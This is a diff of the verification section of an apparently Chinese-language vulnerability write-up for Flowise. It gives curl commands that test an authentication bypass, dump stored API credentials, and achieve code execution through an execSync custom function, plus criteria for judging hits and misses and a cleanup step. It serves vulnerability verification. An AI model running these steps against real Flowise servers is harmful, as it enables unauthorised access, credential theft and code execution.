@@ -101,18 +101,23 @@ curl -s -X POST http://target:3000/api/v1/predictions/${FLOW_ID} \
 ## 验证方法
 
 ```bash
-# 1. 确认认证绕过：返回 chatflow 列表（非 401/403）即存在漏洞
-curl -s -o /dev/null -w "%{http_code}" http://target:3000/api/v1/chatflows
-# 200 = 认证绕过
+# 1. 认证绕过：响应体是 chatflow 数组 JSON，元素含 id / name / flowData 字段
+curl -s http://target:3000/api/v1/chatflows
+# 反例：401/403，或返回登录页 HTML（带登录表单的 Flowise 页面）→ 未绕过
 
-# 2. 确认凭据泄露：返回 API 密钥列表
-curl -s http://target:3000/api/v1/credentials | grep '"name"'
+# 2. 凭据泄露：响应体是凭据数组 JSON，元素含 credentialName / encryptedData（如 openAIApi 凭据）
+curl -s http://target:3000/api/v1/credentials
+# 反例：同上的登录页 HTML，或空数组（服务端没存凭据时不能凭状态码判定）
 
-# 3. RCE 验证：通过 prediction 触发自定义函数，响应中包含命令输出
+# 3. RCE：按 ## Payload 创建 chatflow，把 customFunction 的命令换成 echo 本次标记，再触发 prediction
+#    javascriptFunction: const {execSync} = require("child_process"); return execSync("echo POC_TOKEN").toString();
+FLOW_ID="<上一步创建响应中的 id>"
 curl -s -X POST "http://target:3000/api/v1/predictions/${FLOW_ID}" \
   -H "Content-Type: application/json" \
-  -d '{"question":"trigger"}' \
-  | grep "uid="
+  -d '{"question":"trigger"}'
+# 判据：响应 JSON 的 text 字段出现 POC_TOKEN
+# 反例：只创建成功（返回 chatflow 对象）但触发后 text 里没有标记串，不算 RCE
+# 清理：DELETE http://target:3000/api/v1/chatflows/${FLOW_ID}
 ```
 
 ## 指纹确认
